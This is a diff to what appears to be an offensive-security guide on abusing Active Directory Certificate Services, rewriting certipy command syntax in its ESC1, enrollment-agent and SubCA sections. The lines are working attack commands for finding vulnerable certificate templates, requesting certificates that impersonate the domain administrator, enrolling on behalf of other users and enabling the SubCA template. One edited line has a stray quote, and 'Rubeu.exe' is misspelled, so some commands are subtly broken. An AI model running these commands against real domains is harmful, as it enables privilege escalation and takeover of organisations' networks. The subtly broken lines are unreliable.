@@ -41,14 +41,14 @@ To **find vulnerable certificate templates** you can run:
 
 ```bash
 Certify.exe find /vulnerable
-certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
+certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
 ```
 
 To **abuse this vulnerability to impersonate an administrator** one could run:
 
 ```bash
 Certify.exe request /ca:dc.theshire.local-DC-CA /template:VulnTemplate /altname:localadmin
-certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
+certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
 ```
 
 Then you can transform the generated **certificate to `.pfx`** format and use it to **authenticate using Rubeus or certipy** again:
@@ -123,12 +123,12 @@ You can use [**Certify**](https://github.com/GhostPack/Certify) or [**Certipy**]
 ```bash
 # Request an enrollment agent certificate
 Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent
-certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'templateName'
+certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'
 
 # Enrollment agent certificate to issue a certificate request on behalf of
 # another user to a template that allow for domain authentication
 Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
-certipy req 'corp.local/john:Pass0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'
+certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'
 
 # Use Rubeus with the certificate to authenticate as the other user
 Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
@@ -323,7 +323,7 @@ The **`SubCA`** template can be **enabled on the CA** with the `-enable-template
 
 ```bash
 # List templates
-certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -enable-template 'SubCA'
+certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
 ## If SubCA is not there, you need to enable it
 
 # Enable SubCA
